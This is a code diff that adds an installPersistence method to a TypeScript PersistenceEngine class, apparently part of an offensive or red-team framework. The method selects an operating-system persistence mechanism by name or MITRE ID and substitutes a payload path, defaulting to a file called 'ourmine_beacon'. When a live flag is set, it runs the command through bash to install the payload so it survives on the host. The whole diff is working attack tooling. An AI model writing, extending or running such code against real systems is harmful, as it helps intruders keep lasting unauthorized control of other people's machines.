@@ -284,4 +284,39 @@ export class PersistenceEngine {
     else mechs = [...this.getWindowsPersistence(), ...this.getLinuxPersistence(), ...this.getMacosPersistence()];
     return mechs.map((m) => this.executePersistence(m));
   }
+
+  /** Install persistence mechanism when live — runs command through OPSEC gate. */
+  async installPersistence(
+    mechanismName: string,
+    opts: { live?: boolean; targetOs?: string; payloadPath?: string } = {},
+  ): Promise<Record<string, unknown>> {
+    const os = opts.targetOs || (this.currentOs === "win32" ? "windows" : this.currentOs === "darwin" ? "macos" : "linux");
+    let mechs: PersistenceMechanism[];
+    if (os === "windows") mechs = this.getWindowsPersistence();
+    else if (os === "macos") mechs = this.getMacosPersistence();
+    else mechs = this.getLinuxPersistence();
+    const m = mechs.find((x) => x.name.toLowerCase() === mechanismName.toLowerCase())
+      ?? mechs.find((x) => x.mitreId === mechanismName)
+    if (!m) return { error: `unknown mechanism: ${mechanismName}`, installed: false }
+
+    const payload = opts.payloadPath ?? "/tmp/ourmine_beacon"
+    const command = m.command.replace(/C:\\Users\\Public\\update\.exe|\/tmp\/update\.sh|update\.exe/g, payload)
+
+    if (!opts.live) {
+      return { ...this.executePersistence(m), command, installed: false, dryRun: true, note: "pass live:true to install" }
+    }
+
+    const { execLive } = await import("./live_executor.ts")
+    const res = await execLive("bash", command, { live: true, profile: "persistence" })
+    return {
+      name: m.name,
+      mitre_id: m.mitreId,
+      command,
+      installed: res.exitCode === 0,
+      dryRun: false,
+      stdout: res.stdout.slice(0, 500),
+      stderr: res.stderr.slice(0, 500),
+      exitCode: res.exitCode,
+    }
+  }
 }
